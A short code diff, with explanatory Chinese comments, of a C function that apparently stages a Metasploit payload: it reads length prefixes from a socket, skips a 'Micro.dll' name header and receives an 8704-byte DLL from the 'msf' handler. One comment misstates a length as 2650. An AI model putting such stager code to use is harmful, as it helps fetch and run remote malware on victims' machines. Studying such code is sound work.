@@ -51,21 +51,28 @@ BOOL GetPEDLL() {
 
 	int ret = 0;
 	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
-	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
-	ret = recv(socks, (PCHAR)bFileBuffer, 1, NULL);
+	
+	//表示即将传输的数据的字节数，在这两个例子中是2650，因此最先接受到的四个比特的数据是0x5a0a0000.
+	//又因为小端存储，所以真正想表达的数据是，0x00000a5a，转化成10进制就是2650.
+	ret = recv(socks, (PCHAR)bFileBuffer, 4, NULL);  //这种接收数据的方式是从缓冲区的第一个字节开始接收，也就是如果我们先接收了123，然后又接收了4，那么数据就会变成423.
 	ret = recv(socks, (PCHAR)bFileBuffer, 2650, NULL);
 	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
 
 
-	//传送四个数据还有\x00分隔符
-	ret = recv(socks, (PCHAR)bFileBuffer,5, NULL); 
+	//表示即将传输的数据的字节数，在这两个例子中是2650，因此最先接受到的四个比特的数据是0x0a220000.
+	//又因为小端存储，所以真正想表达的数据是，0x0000220a，转化成10进制就是8714.
+	ret = recv(socks, (PCHAR)bFileBuffer,4, NULL); 
 
 
-	//传送LibraryName还有\x00分隔符，由于我将LibraryName设置为了Micro.dll，有9个字符，需要九个字节来传输，再加上一个分隔符就是十个字节。
+	//由于我知道我想下载的dll文件是8704字节可是msf传送给我的是8714字节，这是因为它多传送了一个LibraryName还有\x00分隔符，
+	//由于我将LibraryName设置为了Micro.dll，有9个字符，需要九个字节来传输，再加上一个分隔符就是十个字节，刚好凑够了多传送的10个字节。
+	//为了不影响真正我们需要的那个dll文件，所以我们先将这10个多余的字节接收过来，然后再接收我们需要的真正的dll文件，再接收dll文件后会自动覆盖刚才的缓冲区
+	//不会影响dll文件的整体性。
 	ret = recv(socks, (PCHAR)bFileBuffer,10, NULL);
+	
+	//为了安全起见，我们还是将缓冲区的所有位置0.
 	ZeroMemory(bFileBuffer, PAYLOAD_SIZE);
+	//接收我们的dll文件。
 	ret = recv(socks, (PCHAR)bFileBuffer, 8704, NULL);
 
 	if (ret > 0)
